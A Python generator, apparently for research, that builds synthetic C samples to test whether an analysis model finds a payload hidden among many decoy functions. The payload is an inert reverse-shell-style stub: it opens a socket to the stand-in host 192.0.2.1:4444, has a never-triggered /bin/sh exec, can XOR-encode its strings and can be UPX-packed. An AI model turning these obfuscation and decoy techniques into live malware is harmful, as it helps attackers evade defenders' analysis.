#!/usr/bin/env python3
"""Scalable synthetic sample generator for the large-scale A/B.

Builds N C functions with a controllable payload priority / decoy volume /
obfuscation level, so the same sample can be fed to a naive one-prompt victim
and to CrowbarAF's selection. No real malware, no network.

Usage:
    python3 attacker/scale.py --functions 300 --payload-priority 0 --out /tmp/scale_300.json
    python3 attacker/scale.py --functions 300 --compile --pack upx
"""
from __future__ import annotations

import argparse
import json
import os
import random
import subprocess

URL = "http://192.0.2.1:4444/gate.php"
IP = "192.0.2.1"
KEY = 0x5A

HEADERS = """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
"""


def _plain_payload() -> str:
    return f"""\
__attribute__((noinline)) static void payload(void) {{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr("{IP}");
    if (getenv("CROWBAR_NEVER_SET") != NULL) {{
        execl("/bin/sh", "sh", (char *)0);
    }}
    printf("connecting to %s\\n", "{URL}");
    (void)s;
}}
"""


def _encoded_payload() -> str:
    eip = ", ".join(str(b ^ KEY) for b in IP.encode())
    eurl = ", ".join(str(b ^ KEY) for b in URL.encode())
    return f"""\
__attribute__((noinline)) static void payload(void) {{
    unsigned char eip[] = {{ {eip} }};
    unsigned char eurl[] = {{ {eurl} }};
    char ip[32], url[96];
    int i;
    for (i = 0; i < {len(IP)}; i++) ip[i] = (char)(eip[i] ^ {hex(KEY)});
    ip[{len(IP)}] = 0;
    for (i = 0; i < {len(URL)}; i++) url[i] = (char)(eurl[i] ^ {hex(KEY)});
    url[{len(URL)}] = 0;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr(ip);
    if (getenv("CROWBAR_NEVER_SET") != NULL) {{
        execl("/bin/sh", "sh", (char *)0);
    }}
    printf("connecting to %s\\n", url);
    (void)s;
}}
"""


def _decoy(name: str, level: int, seed: int) -> str:
    """CFF-like switch/XOR noise; valid C, no payload."""
    rng = random.Random(seed)
    blocks = 1 if level <= 1 else (2 if level == 2 else 3)
    per_block = 20 if level <= 1 else (40 if level == 2 else 70)
    lines = [f"int {name}(char *s, int n) {{", "  int st = 0, r = 0;", "  while (1) {", "    switch (st) {"]
    for b in range(blocks):
        lines.append(f"      case {b}:")
        lines.append("        if (((n * n + n) & 1) == 0) {")
        for k in range(per_block):
            idx = b * per_block + k
            key = rng.choice(["0x5a", "0x33", "(0x2d + 0x2d)", "0x7f"])
            lines.append(f"          s[{idx}] = (char)(s[{idx}] ^ {key});")
        lines.append(f"        }} else {{ r = r + {b}; }}")
        lines.append(f"        st = {(b + 1) if b + 1 < blocks else 99}; break;")
    lines.append("      default: break;")
    lines.append("    }")
    lines.append("    if (st == 99) break;")
    lines.append("  }")
    lines.append("  return r;")
    lines.append("}")
    return "\n".join(lines)


def build(functions: int = 100, payload_priority: int = 0, cff: int = 1,
          encoded: bool = False, benign: bool = False, seed: int = 1) -> dict:
    """Return a deterministic sample dict (functions + concatenated code)."""
    n = max(3, functions)
    fns: list[dict] = []

    payload_code = _plain_payload() if not encoded else _encoded_payload()
    if not benign:
        fns.append({"offset": "0x401000", "name": "payload", "c_code": payload_code,
                    "priority": payload_priority, "callees": []})

    fns.append({"offset": "0x401100", "name": "checksum",
                "c_code": "int checksum(char *s, int n){unsigned h=0;for(int i=0;i<n;i++)h=h*31u+(unsigned char)s[i];return (int)h;}",
                "priority": 3, "callees": []})
    fns.append({"offset": "0x401200", "name": "main", "c_code":
                "int main(void){ payload(); return 0; }" if not benign
                else "int main(void){ return 0; }",
                "priority": 0, "callees": ["0x401000"] if not benign else []})

    rng = random.Random(seed)
    for i in range(n - len(fns)):
        name = f"decoy_{i:04d}"
        fns.append({"offset": f"0x42{i:06x}", "name": name,
                    "c_code": _decoy(name, cff, rng.randrange(1 << 30)),
                    "priority": 0, "callees": []})

    code = "\n\n".join(f"/* {f['name']} @ {f['offset']} */\n{f['c_code']}" for f in fns)
    return {
        "kind": "scale",
        "functions": fns,
        "code": code,
        "chars": len(code),
        "approx_tokens": len(code) // 4,
        "payload_offset": "0x401000" if not benign else None,
        "payload_url": URL if not benign else None,
        "has_payload": not benign,
        "payload_priority": payload_priority,
        "cff": cff,
        "encoded": encoded,
        "n_functions": len(fns),
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--functions", type=int, default=100)
    ap.add_argument("--payload-priority", type=int, default=0)
    ap.add_argument("--cff", type=int, default=1, choices=(1, 2, 3))
    ap.add_argument("--encoded", action="store_true")
    ap.add_argument("--benign", action="store_true")
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--out", required=True)
    ap.add_argument("--compile", action="store_true", help="write and build a real ELF")
    ap.add_argument("--pack", choices=("none", "upx"), default="none")
    args = ap.parse_args()

    sample = build(args.functions, args.payload_priority, args.cff,
                   args.encoded, args.benign, args.seed)
    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(sample, fh, ensure_ascii=False, indent=1)
    print(f"wrote {args.out}: {sample['n_functions']} functions, "
          f"{sample['chars']} chars (~{sample['approx_tokens']} tok)")

    if args.compile:
        root = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
        samples = os.path.join(root, "samples")
        os.makedirs(samples, exist_ok=True)
        tag = f"scale_{args.functions}_{'benign' if args.benign else args.payload_priority}_{args.cff}" \
              f"{'_enc' if args.encoded else ''}"
        src = os.path.join(samples, f"sample_{tag}.c")
        body = HEADERS + "\n" + sample["code"] + "\n"
        with open(src, "w", encoding="utf-8") as fh:
            fh.write(body)
        binary = os.path.join(samples, f"bin_{tag}")
        proc = subprocess.run(["gcc", "-O0", "-w", "-o", binary, src],
                              capture_output=True, text=True)
        print(f"build: {'OK' if proc.returncode == 0 else proc.stderr.strip()[:120]} -> {binary}")
        if proc.returncode == 0 and args.pack == "upx":
            packed = binary + ".upx"
            p2 = subprocess.run(["upx", "-9", "-o", packed, binary],
                                capture_output=True, text=True)
            print(f"upx: {'OK' if p2.returncode == 0 else p2.stderr.strip()[:120]} -> {packed}")


if __name__ == "__main__":
    main()
